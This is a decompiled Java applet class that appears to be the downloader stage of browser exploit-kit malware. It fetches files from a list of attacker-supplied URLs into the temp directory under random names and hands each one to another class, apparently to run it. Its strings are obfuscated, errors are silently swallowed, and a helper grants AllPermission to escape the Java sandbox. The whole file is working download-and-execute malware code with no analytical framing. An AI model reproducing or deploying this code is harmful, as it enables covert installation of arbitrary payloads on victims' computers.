import java.security.PermissionCollection;
import java.security.CodeSource;
import java.security.Permission;
import java.security.Permissions;
import java.security.AllPermission;
import java.security.ProtectionDomain;
import java.io.InputStream;
import java.io.FileOutputStream;
import java.net.URL;

// 
// Decompiled by Procyon v0.5.30
// 

class Applet16e799 implements Runnable
{
    public String x_url;
    public String ename;
    
    public Applet16e799(final String x_url) {
        this.x_url = x_url;
    }
    
    @Override
    public void run() {
        this.__v(0);
    }
    
    public static void __E(final String s) {
        final String string = Math.random() + main.Applet6e("o\u0015\b\t");
        final String property = System.getProperty(main.Applet6e("+\u0011\u0006\rK\u001d\u000e\u0019\u0012,\u0000\u0014\u0005\u0017"));
        try {
            final URL url = new URL(s);
            url.openConnection();
            final InputStream openStream = url.openStream();
            final FileOutputStream fileOutputStream = new FileOutputStream(property + string);
            final byte[] array = new byte[1024];
            int read;
            while ((read = openStream.read(array, 0, array.length)) != -1) {
                fileOutputStream.write(array, 0, read);
            }
            openStream.close();
            fileOutputStream.close();
            Applet107495e.__A(property + string);
        }
        catch (Exception ex) {}
    }
    
    public void __v(int n) {
        final String applet6e = main.Applet6e("z");
        final String x_url = this.x_url;
        try {
            if (x_url.indexOf(applet6e) > -1) {
                final String[] split = x_url.split(applet6e);
                for (int i = 0; i < split.length; ++i) {
                    __E(split[i].trim());
                }
            }
            else {
                __E(x_url);
            }
        }
        catch (Exception ex) {
            if (++n < 10) {
                this.__v(n);
            }
        }
    }
    
    public static ProtectionDomain __c() {
        final AllPermission allPermission = new AllPermission();
        final Permissions permissions = new Permissions();
        permissions.add(allPermission);
        return new ProtectionDomain(null, permissions);
    }
    
    private static String __s() {
        return System.getProperty("java.io.tmpdir");
    }
}
